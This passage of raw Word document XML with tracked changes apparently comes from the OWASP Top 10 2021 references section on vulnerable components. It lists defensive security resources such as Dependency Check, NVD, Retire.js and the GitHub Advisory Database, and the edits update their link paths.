            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> ~ ".references", id=id ~ "-references", name=title ~ ": References", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6FA1A942" w14:textId="44D7E1C6" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="2430" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling</w:t>
      </w:r>
      <w:del w:id="2431" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://www.owasp.org/index.php/ASVS_V1_Architecture)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2432" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">](/www-project-application-security-verification-standard) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="27E74E6D" w14:textId="194496BB" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2433" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2434"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Dependency Check (for Java and .NET libraries</w:t>
      </w:r>
      <w:del w:id="2435" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)](https://www.owasp.org/index.php/OWASP_Dependency_Check</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="2436" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/www-project-dependency-check</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB87267" w14:textId="7EE18B3F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2437" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2438"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Testing Guide - Map Application Architecture (OTG-INFO-010</w:t>
      </w:r>
      <w:del w:id="2439" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)](https://www.owasp.org/index.php/</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="2440" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Map_Application_Architecture</w:t>
      </w:r>
      <w:del w:id="2441" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_(OTG-INFO-010))</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2442" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1209CC36" w14:textId="1D0BE70A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2443" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2444"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Virtual Patching Best Practices</w:t>
      </w:r>
      <w:del w:id="2445" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://www.owasp.org/index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2446" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>](/www-community</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Virtual_Patching_Best_Practices</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAB3C01" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2447" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0029D63F" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2448" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2449" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="600CE74E" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2450" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CEBF196" w14:textId="659B4C10" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2451" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2452" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [The Unfortunate Reality of Insecure </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Libraries](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2453" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.aspectsecurity.com/research-presentations/the-unfortunate-reality-of-insecure-libraries</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2454" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cdn2.hubspot.net/hub/203759/file-1100864196-pdf/docs/Contrast_-_Insecure_Libraries_2014.pdf</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229FC349" w14:textId="11C1E3F9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2455" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2456" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [MITRE Common Vulnerabilities and Exposures (CVE) </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>search](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://www.cvedetails.com/version-search.php)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66139F69" w14:textId="565378FC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2457" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2458" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [National Vulnerability Database (NVD</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://nvd.nist.gov/)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D75B75" w14:textId="5B5537DB" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2459" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2460" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [Retire.js for detecting known vulnerable JavaScript </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>libraries](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://github.com/retirejs/retire.js/)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DC68F3" w14:textId="6F1634FE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2461" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>* [Node Libraries Security Advisories</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2462" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [GitHub Advisory </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Database</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2463" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>nodesecurity.io</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2464" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>github.com</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/advisories)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B31D21" w14:textId="41FBF560" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2465" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2466" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [Ruby Libraries Security Advisory Database and </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tools](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://rubysec.com/)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29712F5D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2467" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2468" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>SAFECode</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Software Integrity Controls \[PDF\</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>]](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://safecode.org/publication/SAFECode_Software_Integrity_Controls0610.pdf)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7632DB59" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
